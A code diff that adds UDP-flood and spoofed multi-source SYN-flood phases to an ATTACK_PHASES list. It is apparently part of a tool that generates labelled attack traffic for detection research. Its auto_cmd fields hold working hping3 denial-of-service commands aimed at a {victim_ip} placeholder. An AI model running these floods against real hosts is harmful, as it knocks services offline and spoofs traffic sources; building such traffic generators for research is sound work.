@@ -102,6 +102,34 @@ ATTACK_PHASES = [
             "sudo hping3 -S -p 80 -c 500000 {victim_ip}"
         ),
     },
+    {
+        # DoS attack: single-source UDP flood targeting port 80.
+        # hping3 --udp sends raw UDP datagrams at maximum rate.
+        # This exhausts bandwidth/CPU on the victim without a TCP handshake,
+        # producing a very different traffic signature from the SYN flood above.
+        "label": "DoSUDPFlood",
+        "description": "hping3 UDP flood targeting port 80",
+        "default_duration": 30,
+        "auto_cmd": (
+            "sudo hping3 --udp -p 80 -c 500000 {victim_ip}"
+        ),
+    },
+    {
+        # DDoS simulation: multiple hping3 processes launched in parallel,
+        # each spoofing a different source IP range to simulate traffic
+        # arriving from many different hosts (as in a real botnet DDoS).
+        # '--rand-source' instructs hping3 to randomise the source IP per packet.
+        # Note: requires root; spoofed packets will not receive responses.
+        "label": "DDoSSYNFlood",
+        "description": "hping3 multi-source spoofed SYN flood simulating DDoS",
+        "default_duration": 30,
+        "auto_cmd": (
+            "sudo hping3 -S --rand-source -p 80 -c 200000 {victim_ip} & "
+            "sudo hping3 -S --rand-source -p 443 -c 200000 {victim_ip} & "
+            "sudo hping3 -S --rand-source -p 22 -c 100000 {victim_ip} & "
+            "wait"
+        ),
+    },
 ]
 
 
